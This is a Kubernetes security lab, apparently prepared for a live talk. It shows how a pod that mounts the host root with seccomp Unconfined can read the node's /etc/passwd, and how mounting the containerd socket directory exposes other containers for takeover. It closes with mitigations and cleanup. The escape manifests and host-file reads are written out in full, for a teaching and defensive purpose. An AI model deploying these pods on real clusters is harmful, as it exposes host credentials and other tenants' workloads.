# Lab 6 — Insecure Volume Mounts & Seccomp Bypass

## Objective
Demonstrate how **hostPath: /** with **seccomp: Unconfined** lets a pod read sensitive files from the **node’s filesystem**, and how mounting **/run/containerd** enables **container takeover**. Close with practical mitigations.

---

## Prereqs
- Docker (or compatible) running
- `k3d` and `kubectl` installed

---

## 0) Create a fresh cluster for this lab
```bash
# Create an isolated k3d cluster
k3d cluster create lab6   --agents 1   --servers 1   --k3s-arg "--disable=traefik@server:*"

# Sanity check
kubectl cluster-info
kubectl get nodes -o wide
```

Create the lab namespace:
```bash
kubectl create ns lab6
```

---

## 1) Pod with full hostPath (/) and seccomp Unconfined
This pod mounts the **host root** at `/mnt/host` (read-only) and disables seccomp filtering so low‑level tooling isn’t blocked.

```bash
cat <<'YAML' > lab6-escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: lab6
  labels:
    app: lab6
spec:
  securityContext:
    seccompProfile:
      type: Unconfined
  containers:
  - name: pwn
    image: alpine:3.20
    command: ["sleep","infinity"]
    securityContext:
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host
      mountPath: /mnt/host
      readOnly: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
YAML

kubectl apply -f lab6-escape-pod.yaml
kubectl -n lab6 wait pod/escape-pod --for=condition=Ready --timeout=60s
```

### Show the seccomp state (why “Unconfined” matters)
```bash
kubectl -n lab6 exec escape-pod -- sh -c 'grep -E "Seccomp|Name" /proc/1/status'
# Expect: "Seccomp: 0" → unconfined
```

### Exfiltrate a sensitive host file (proof)
```bash
# List host /etc and read passwd
kubectl -n lab6 exec -it escape-pod -- sh -lc   'ls -la /mnt/host/etc | head -n 20 && echo "---" && head -n 20 /mnt/host/etc/passwd'
```


---

## 2) Mount container runtime socket (container takeover)
Now mount **/run/containerd**. With tooling like `crictl` (if available), you can enumerate and control other containers via the host runtime socket.

```bash
cat <<'YAML' > lab6-runtime-pwn.yaml
apiVersion: v1
kind: Pod
metadata:
  name: runtime-pwn
  namespace: lab6
  labels:
    app: lab6
spec:
  securityContext:
    seccompProfile:
      type: Unconfined
  containers:
  - name: tools
    image: alpine:3.20
    command: ["sleep","infinity"]
    volumeMounts:
    - name: k3s
      mountPath: /mnt/k3s
      readOnly: false
  volumes:
  - name: k3s
    hostPath:
      path: /run/k3s
      type: Directory
YAML

kubectl apply -f lab6-runtime-pwn.yaml
kubectl -n lab6 wait pod/runtime-pwn --for=condition=Ready --timeout=60s

# Inspect the directory and the socket
kubectl -n lab6 exec -it runtime-pwn -- sh -lc '
  ls -l /mnt/k3s/containerd | head -n 10;
  echo "---";
  ls -l /mnt/k3s/containerd/containerd.sock 2>/dev/null || echo "containerd.sock not found";
  echo "---";
  if [ -S /mnt/k3s/containerd/containerd.sock ]; then
    echo "OK: /mnt/k3s/containerd/containerd.sock is a Unix socket";
  else
    echo "NOT OK: socket missing or wrong path";
  fi
'

kubectl -n lab6 exec -it runtime-pwn -- sh -lc '
  echo "[sandboxes] (pods on this node)"
  ls -1 /mnt/k3s/containerd/io.containerd.grpc.v1.cri/sandboxes 2>/dev/null | sed "s/^/  - /" || echo "  <none>"

  echo
  echo "[containers] (all containers under k8s.io)"
  ls -1 /mnt/k3s/containerd/io.containerd.runtime.v2.task/k8s.io 2>/dev/null | sed "s/^/  - /" || echo "  <none>"

  echo
  echo "[hint] those IDs map to pods/containers; with ctr/crictl you could inspect/exec/kill them."
'

```

---

## 3) (Optional) Contrast with `RuntimeDefault` seccomp
Spin a second pod that’s identical except it uses the **default seccomp** profile.

```bash
cat <<'YAML' > lab6-escape-pod-default-seccomp.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod-default
  namespace: lab6
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: pwn
    image: alpine:3.20
    command: ["sleep","infinity"]
    volumeMounts:
    - name: host
      mountPath: /mnt/host
      readOnly: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
YAML

kubectl apply -f lab6-escape-pod-default-seccomp.yaml
kubectl -n lab6 wait pod/escape-pod-default --for=condition=Ready --timeout=60s

# Show it's filtered (Seccomp: 2)
kubectl -n lab6 exec escape-pod-default -- sh -c 'grep -E "Seccomp|Name" /proc/1/status'
```

---

## 4) Mitigations

### A) Block hostPath to runtime sockets via PodSecurity Admission or policy
```bash
# Enforce the "restricted" Pod Security level at namespace scope
kubectl label ns lab6 pod-security.kubernetes.io/enforce=restricted --overwrite

kubectl -n lab6 delete pod runtime-pwn

# Try to re-apply the runtime socket pod (should be rejected)
kubectl apply -f lab6-runtime-pwn.yaml

#Error from server (Forbidden)
```

### B) Apply strict seccomp (deny‑all → allow‑list)
```bash
kubectl -n lab6 delete pod escape-pod
kubectl apply -f lab6-escape-pod-default-seccomp.yaml
kubectl -n lab6 exec escape-pod-default -- sh -c 'grep -E "Seccomp|Name" /proc/1/status'
```

---

## 5) Cleanup
```bash
k3d cluster delete lab6
```

---

## On‑Stage Cheatsheet (1‑liners)

- **Read host file:**  
  `kubectl -n lab6 exec escape-pod -- sh -lc 'head -n 20 /mnt/host/etc/passwd'`

- **Show Unconfined:**  
  `kubectl -n lab6 exec escape-pod -- sh -c 'grep Seccomp /proc/1/status'`

- **Flip to restricted (watch apply fail):**  
  `kubectl label ns lab6 pod-security.kubernetes.io/enforce=restricted --overwrite`  
  `kubectl apply -f lab6-runtime-pwn.yaml  # expect rejection`
